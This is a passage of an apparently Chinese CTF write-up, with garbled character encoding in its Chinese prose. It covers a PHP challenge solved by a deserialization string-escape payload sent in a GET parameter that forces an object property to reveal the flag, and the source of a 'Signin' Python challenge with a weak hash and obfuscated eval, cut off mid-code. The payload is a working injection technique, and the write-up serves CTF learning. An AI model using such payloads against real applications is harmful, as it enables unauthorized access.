class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:&#123;s:5:"Chant";s:15:"å¤ºå‘½åä¸‰æª";s:11:"Spear_Owner";s:6:"Nobody";&#125;Far away from COOL...</code></pre><p>çœ‹åˆ°äº†<code>require_once(&#39;Hanxin.exe.php&#39;);</code></p><p>Hanxin.exe.php</p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12</span>        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span> <span class="token comment">// 12 32</span>        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>åªè¦è§¦å‘<code>__toString</code>å¹¶è®©<code>Spear_Owner === &#39;MaoLei&#39;</code>å°±è¡Œï¼Œæœ¬æ¥çœ‹ç€<code>Make_a_Move</code>è¿™ä¸ªæ–¹æ³•æ²¡ååº”è¿‡æ¥å¯ä»¥ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œçœ‹äº†wpå¾—åˆ°æç¤º</p><p>é‚£ä¹ˆåªè¦é€šè¿‡Chantæ¥æ„é€ ï¼Œä½¿ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</p><pre class="language-php" data-language="php"><code class="language-php">å…ˆçœ‹æ­£å¸¸çš„ååºåˆ—åŒ–<span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Omg_It_Is_So_Cool_Bring_Me_My_Flag"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Chant"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>å°†Chantæ›¿æ¢ä¸º<span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125; ,O:34:"</span>Omg_It_Is_So_Cool_Bring_Me_My_Flag<span class="token string double-quoted-string">":2:&#123;s:5:"</span>Chant<span class="token string double-quoted-string">";s:36:"</span><span class="token number">1</span><span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>Nobody<span class="token string double-quoted-string">";&#125;"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Spear_Owner"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Nobody"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>å­—ç¬¦ä¸²å¢åŠ äº†<span class="token number">35</span>ï¼Œ<span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span> <span class="token comment">//11 12 æ„é€ 35ä¸ªdi_yi_qiangå³å¯å­—ç¬¦ä¸²é€ƒé€¸</span>Payloadï¼š<span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>chant<span class="token operator">=</span>di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang<span class="token string double-quoted-string">";s:11:"</span>Spear_Owner<span class="token string double-quoted-string">";s:6:"</span>MaoLei"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h4><p>é¢˜ç›®ä»£ç :</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> http<span class="token punctuation">.</span>server<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>        <span class="token keyword">return</span> data__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> 